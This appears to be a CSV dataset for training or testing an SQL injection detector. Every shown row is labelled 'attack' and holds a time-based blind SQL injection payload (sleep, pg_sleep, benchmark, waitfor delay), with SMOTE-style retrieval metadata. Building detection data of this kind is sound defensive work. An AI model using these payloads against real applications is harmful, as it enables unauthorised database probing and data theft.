id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000024,attack,time,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001168,0.48152835259113413
SMOTE_000025,attack,time,"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001004,0.11547922921890656
SMOTE_000026,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.9051010539836081
SMOTE_000027,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,0.4424200000256981
SMOTE_000028,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.4148216609879625
SMOTE_000029,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,0.9970435662181694
SMOTE_000030,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R001068,0.3219035464011867
SMOTE_000031,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R000271,0.33380879152211035
SMOTE_000032,attack,time,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000469,0.6321128563889703
SMOTE_000033,attack,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000667,0.058414659407971456
SMOTE_000034,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,nearest_attack_euclidean,R000835,1.1069920216105598
SMOTE_000035,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,0.46420723608585657
SMOTE_000036,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000295,0.1169341642762536
SMOTE_000037,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000296,0.9147731281430492
SMOTE_000038,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,nearest_attack_euclidean,R001106,0.4392864243275824
SMOTE_000039,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,0.5274919194705786
SMOTE_000040,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.3918128930213104
SMOTE_000041,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000713,0.5852419660660063
SMOTE_000042,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000589,0.3537089248198375
SMOTE_000043,attack,time,1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',nearest_attack_euclidean,R000331,0.49955353971163663
SMOTE_000044,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,0.14835878616544063
SMOTE_000045,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000397,0.9355989368649688
SMOTE_000046,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.42404287260633344
SMOTE_000047,attack,time,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000777,0.3897419135777071
SMOTE_000048,attack,time,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",nearest_attack_euclidean,R000174,0.6588737188959558
SMOTE_000049,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000787,0.21293373897102433
SMOTE_000050,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.5791247741974851
SMOTE_000051,attack,time,"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001177,0.09824434939693741
SMOTE_000052,attack,time,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000777,0.5353969409760991
SMOTE_000053,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,0.004078752126463113
SMOTE_000054,attack,time,1 and sleep  (  5  ) ,nearest_attack_euclidean,R001131,0.04926740018028832
SMOTE_000055,attack,time,1 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000316,0.0878263135432923
SMOTE_000056,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,0.5251721279049619
SMOTE_000057,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,0.17323201000481558
SMOTE_000058,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R001159,1.1111598186834697
SMOTE_000059,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R001027,0.8666431260972515
SMOTE_000060,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000886,0.5525517444371764
SMOTE_000061,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,nearest_attack_euclidean,R000408,0.13747907584525937
SMOTE_000062,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000161,0.040124315553505464
SMOTE_000063,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000512,0.0026807674892054914
SMOTE_000064,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000703,0.008112494752440906
SMOTE_000065,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000744,0.22012968817820844
SMOTE_000066,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000656,0.1376744463339333
SMOTE_000067,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000766,0.6338622767435315
SMOTE_000068,attack,time,"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000552,0.6409688548520341
SMOTE_000069,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000260,0.5227837417768094
SMOTE_000070,attack,time,"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000413,0.9559012769775858
SMOTE_000071,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.7306258783698057
SMOTE_000072,attack,time,1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||',nearest_attack_euclidean,R000654,1.3021951557888694
SMOTE_000073,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,0.882085266903813
SMOTE_000074,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,0.22982876076180028
SMOTE_000075,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,0.7643193175352014
SMOTE_000076,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.0756359159039612
SMOTE_000077,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.16864585602237694
SMOTE_000078,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,0.0719964031687835
SMOTE_000079,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.2514854272249939
SMOTE_000080,attack,time,1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000848,0.9797452970758962
SMOTE_000081,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000875,0.22954252035164813
SMOTE_000082,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000224,0.05050239342955026
SMOTE_000083,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000744,0.22165590691350037
SMOTE_000084,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000937,0.3454969379320579
SMOTE_000085,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,0.868645567930101
SMOTE_000086,attack,time,1 rlike sleep  (  5  )  # urxh,nearest_attack_euclidean,R000754,0.4417595871501728
SMOTE_000087,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000558,0.9541726423618935
SMOTE_000088,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R001024,0.7223291202630426
SMOTE_000089,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000993,0.3662606689784854
SMOTE_000090,attack,time,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000659,0.2813805591595385
SMOTE_000091,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,0.9675907727592921
SMOTE_000092,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,0.3612176440903154
SMOTE_000093,attack,time,"1"" where 3329  =  3329 or sleep  (  5  )  --",nearest_attack_euclidean,R000527,0.8021635703255003
SMOTE_000094,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000904,0.7647073959265808
SMOTE_000095,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R001169,0.4733000672380525
SMOTE_000096,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",nearest_attack_euclidean,R000467,0.09246965179638056
SMOTE_000097,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R000975,0.5155403892040904
SMOTE_000098,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.12792131092643616
SMOTE_000099,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,1.4803096149995247
SMOTE_000100,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000719,0.4245061495682025
SMOTE_000101,attack,time,"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000498,0.9775591782101072
SMOTE_000102,attack,time,"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000636,0.3391266111308476
SMOTE_000103,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6910501681585037
SMOTE_000104,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov",nearest_attack_euclidean,R000747,0.19307953105717882
SMOTE_000105,attack,time," select sleep  (  5  )   and ""oivc"" like ""oivc",nearest_attack_euclidean,R000621,0.8837428625860759
SMOTE_000106,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000779,0.8842568036240658
SMOTE_000107,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,0.4297076490724081
SMOTE_000108,attack,time,1' or sleep  (  5  )   and 'yudo'  =  'yudo,nearest_attack_euclidean,R000802,0.3847433414049722
SMOTE_000109,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,1.2896347878719387
SMOTE_000110,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000346,0.5431604665014915
SMOTE_000111,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R001081,0.05621916287743486
SMOTE_000112,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000412,0.3894692281642317
SMOTE_000113,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000912,7.332503993157493
SMOTE_000114,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",nearest_attack_euclidean,R001093,0.15336180093630727
SMOTE_000115,attack,time,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001009,0.6159905238614527
SMOTE_000116,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.7198454756087649
SMOTE_000117,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,0.0292076574271311
SMOTE_000118,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000828,0.517642717498535
SMOTE_000119,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R000832,0.7198435117006546
SMOTE_000120,attack,time,select sleep  (  5  )   and 'eskp' like 'eskp,nearest_attack_euclidean,R000300,0.2682131708228996
SMOTE_000121,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.9308254860856511
SMOTE_000122,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,nearest_attack_euclidean,R000533,0.009266650522613376
SMOTE_000123,attack,time,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000920,0.807179484529524
SMOTE_000124,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000908,0.5076282459707446
SMOTE_000125,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000506,0.04288719539606084
SMOTE_000126,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,0.4783935932702883
SMOTE_000127,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.37197174596175947
SMOTE_000128,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.003731202814217605
SMOTE_000129,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,0.654818672138986
SMOTE_000130,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000860,1.101854185429188
SMOTE_000131,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000547,0.4956682566686429
SMOTE_000132,attack,time,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000273,0.5630909333719538
SMOTE_000133,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.25438798599321805
SMOTE_000134,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,0.9167304239387323
SMOTE_000135,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,0.07196568682964817
SMOTE_000136,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,0.20638372149694503
SMOTE_000137,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.7402764870248645
SMOTE_000138,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000372,0.4246143939312623
SMOTE_000139,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.08998409077041908
SMOTE_000140,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.06472189197340708
SMOTE_000141,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000873,0.7974370496529741
SMOTE_000142,attack,time,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000553,0.755491239932713
SMOTE_000143,attack,time,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",nearest_attack_euclidean,R000407,0.6185690407155248
SMOTE_000144,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.0001887881504074707
SMOTE_000145,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000898,0.23355759931550296
SMOTE_000146,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R001121,0.18006810932588319
SMOTE_000147,attack,time,"1""  )   where 9656  =  9656 and sleep  (  5  )  --",nearest_attack_euclidean,R001097,0.25594121112679213
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.27381930348944356
SMOTE_000149,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.964215916197373
SMOTE_000150,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R001094,0.021810703822817017
SMOTE_000151,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,0.09860687674377627
SMOTE_000152,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,0.04311597591770347
SMOTE_000153,attack,time,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000798,0.5061927300887255
SMOTE_000154,attack,time,1' and sleep  (  5  )  #,nearest_attack_euclidean,R001036,1.0790449994395046
SMOTE_000155,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R000975,0.5297419759615472
SMOTE_000156,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000804,0.15342242968211475
SMOTE_000157,attack,time,1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001060,0.2068741747859422
SMOTE_000158,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000516,0.5211445543561855
SMOTE_000159,attack,time,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000778,0.6156003440893912
SMOTE_000160,attack,time,"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000673,0.09990705902287206
SMOTE_000161,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000473,0.4458451671214977
SMOTE_000162,attack,time,1 where 9620  =  9620 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000477,0.1484652478982598
SMOTE_000163,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,0.05154746864439978
SMOTE_000164,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,0.2949755746114712
SMOTE_000165,attack,time,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000357,0.5504800787673079
SMOTE_000166,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R001083,1.1790000636843572
SMOTE_000167,attack,time,"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000391,0.22865455134802454
SMOTE_000168,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000377,0.09192118026803366
SMOTE_000169,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,0.1319818400291185
SMOTE_000170,attack,time,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R001088,1.0949103095558803
SMOTE_000171,attack,time,"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000478,0.16772951621605053
SMOTE_000172,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000960,0.5100983735928155
SMOTE_000173,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000816,0.3229713953614633
